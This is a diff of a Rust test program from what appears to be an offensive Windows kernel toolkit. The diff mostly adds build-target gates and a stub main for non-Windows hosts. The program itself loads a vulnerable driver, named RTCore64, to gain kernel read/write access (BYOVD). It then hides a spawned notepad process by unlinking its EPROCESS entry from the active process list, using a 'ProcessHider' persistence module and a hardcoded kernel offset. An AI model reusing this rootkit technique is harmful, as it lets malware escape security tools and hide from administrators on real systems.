@@ -16,13 +16,18 @@
 //!
 //! 编译/运行同 etw_ti_blind_test。
 
-#![cfg(target_os = "windows")]
 
+
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::offsets::{eprocess, for_build, EprocessOffsets};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::persistence::ProcessHider;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::KernelRw;
 
+#[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
     'y' as u16,
@@ -55,11 +60,14 @@ const SYS_PATH: &[u16] = &[
     's' as u16,
     0,
 ];
+#[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
     'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
+#[cfg(target_os = "windows")]
 const PS_ACTIVE_PROCESS_HEAD_RVA: u32 = 0x40E5C0;
 
+#[cfg(target_os = "windows")]
 extern "system" {
     fn RtlAdjustPrivilege(
         privilege: u32,
@@ -68,6 +76,7 @@ extern "system" {
         enabled: *mut i32,
     ) -> i32;
 }
+#[cfg(target_os = "windows")]
 fn enable_privileges() {
     for luid in [10u32, 20u32] {
         let mut p: i32 = 0;
@@ -76,6 +85,7 @@ fn enable_privileges() {
 }
 
 /// 启一个 notepad，返回它的 PID。
+#[cfg(target_os = "windows")]
 fn spawn_notepad() -> u32 {
     use std::process::Command;
     let child = Command::new("notepad.exe").spawn().expect("spawn notepad");
@@ -83,6 +93,7 @@ fn spawn_notepad() -> u32 {
 }
 
 /// tasklist 找 notepad，返回它能看到几个 notepad 实例。
+#[cfg(target_os = "windows")]
 fn count_notepad() -> usize {
     let out = std::process::Command::new("tasklist")
         .args(["/FI", "IMAGENAME eq notepad.exe", "/NH", "/FO", "CSV"])
@@ -102,6 +113,7 @@ fn count_notepad() -> usize {
 /// unlink 把 victim self-loop 了（link_kva->Flink=link_kva, Blink=link_kva）。
 /// 要恢复需知道它原本的邻居——但 unlink 后邻居已互相指向，victim 脱离了。
 /// 最安全的恢复：把 victim 重新插回 list head 之后（头部插入，顺序不重要）。
+#[cfg(target_os = "windows")]
 fn relink(krw: &dyn KernelRw, head_kva: usize, eproc_kva: usize) -> Result<(), String> {
     let link_kva = eproc_kva + eprocess::ACTIVE_PROCESS_LINKS;
     // head->Flink = 第一个进程的 link。我们把自己插到 head 和 head.Flink 之间。
@@ -125,6 +137,7 @@ fn relink(krw: &dyn KernelRw, head_kva: usize, eproc_kva: usize) -> Result<(), S
     Ok(())
 }
 
+#[cfg(target_os = "windows")]
 fn main() {
     println!("[proc_hide_test] start pid={}", std::process::id());
     enable_privileges();
@@ -222,4 +235,24 @@ fn main() {
 
     println!("\n[proc_hide_test] DONE.");
     std::mem::forget(loaded);
+}
+
+
+// ----------------------------------------------------------------------------
+// Non-Windows entry-point fallback (E0601 mitigation).
+//
+// The real `fn main()` (and every Windows-only item above) is gated by
+// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
+// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
+// body compiles to nothing and the build would fail with E0601 ("main
+// function not found"). This stub exists solely to satisfy the crate root on
+// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
+// mutually exclusive with the Windows `main` above and never runs on target.
+// ----------------------------------------------------------------------------
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!(
+        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
+        env!("CARGO_BIN_NAME")
+    );
 }
